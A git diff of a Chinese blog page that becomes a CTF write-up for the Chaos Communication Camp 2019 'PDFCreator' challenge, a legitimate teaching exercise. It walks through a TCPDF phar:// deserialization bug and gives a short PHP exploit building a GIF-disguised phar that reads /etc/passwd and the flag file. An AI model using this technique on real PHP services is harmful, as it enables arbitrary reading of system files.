@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>归档 | 过客</title>
+  <title>[Chaos Communication Camp 2019]PDFCreator | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="归档 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[Chaos Communication Camp 2019]PDFCreator | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[Chaos Communication Camp 2019]PDFCreator"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/k5ETxxrF2/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -73,75 +78,105 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">Archives</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[Chaos Communication Camp 2019]PDFCreator</h1>
+            <span class="meta">
+            	Posted on
+              2020-05-04，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
   <!-- Post Content -->
   <article>
     <div class="container">
       <div class="row">
-        
-      
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="post-archives">
-    <h2 class="year">2020</h2>
-    
-                
-        <a href="https://guokeya.github.io/post/Olw-A4WVi/" class="post">
-          <h2 class="post-title Archives">
-            Mysql limit注入
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/" class="post">
-          <h2 class="post-title Archives">
-            Metasploit生成免杀木马
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/" class="post">
-          <h2 class="post-title Archives">
-            Redis RCE 漏洞复现
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/" class="post">
-          <h2 class="post-title Archives">
-            CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/" class="post">
-          <h2 class="post-title Archives">
-            利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-        </div>
-        </div>
+          <p>首先就github上源码。<br>
+在index.php末尾部分中看到如下代码</p>
+<!-- more -->
+<pre><code>else if (isset($_POST[&quot;pdfcontent&quot;]))
+{
+	$creator = new \PDFStuff\PDFCreator();
+	$creator-&gt;createPdf($_POST[&quot;pdfcontent&quot;]);
+}
+</code></pre>
+<p>这边调用了PDFStuff命名空间下的PDFCreator函数<br>
+把pdfcontent给带入函数<br>
+看下这个函数。位于creator.php中<br>
+是调用了TCPDF这个库</p>
+<pre><code>function __destruct()
+   {
+      if (file_exists($this-&gt;tmpfile))
+	  {
+		$info = pathinfo($this-&gt;tmpfile);
+		if ($info['extension'] == &quot;pdf&quot;)
+		{
+			unlink($this-&gt;tmpfile);
+		}
+		else
+		{
+			echo &quot;Could not delete created PDF: Not a pdf. Check the file: &quot; . file_get_contents($this-&gt;tmpfile);
+		}
+	  }
+   }
+</code></pre>
+<p>并且在最后。存在一个file_get_contents。任意文件读取。<br>
+<code>https://www.chainnews.com/articles/455445932350.htm</code><br>
+TCPDF库存在一个PHAR反序列化漏洞<br>
+具体没说咋利用。。貌似就是在可控的地方。调用phar协议<br>
+看了一手WP利用。</p>
+<pre><code> &lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;
+	 &lt;img src=&quot;phar://./upload/d7f4be9d064bac5fd42207b3d7efe102_10.jpg&quot; width=&quot;10&quot; height=&quot;10&quot;&gt;
+</code></pre>
+<p>在src这个地方可以用phar伪协议触发反序列化<br>
+接下来就写exp</p>
+<pre><code>&lt;?php
+namespace PDFStuff{
+        class PDFCreator{
+                public $tmpfile='/etc/passwd';
+        }
+}
+namespace {
+$a=new \PDFStuff\PDFCreator();
+@unlink(&quot;phar.phar&quot;);
+$phar=new \Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub('GIF89a'.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($a);
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+}
+</code></pre>
+<p>之前扫目录得到flag.php<br>
+读/var/www/html/flag.php无果<br>
+读/etc/nginx/nginx.conf得到web目录/var/www/site<br>
+读/var/www/site/flag.php。得到Flag</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/RtRt7aQEp/">
+              <span class="post-title">
+                CTFSHOW 36D Web&rarr;
+              </span>
+            </a>
+          </p>
         
+        <div class="comment">
+          
+        </div>
       </div>
     </div>
   </article>
-
-
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -213,3 +248,4 @@
   })(this));</script>
   </body>
 </html>
+
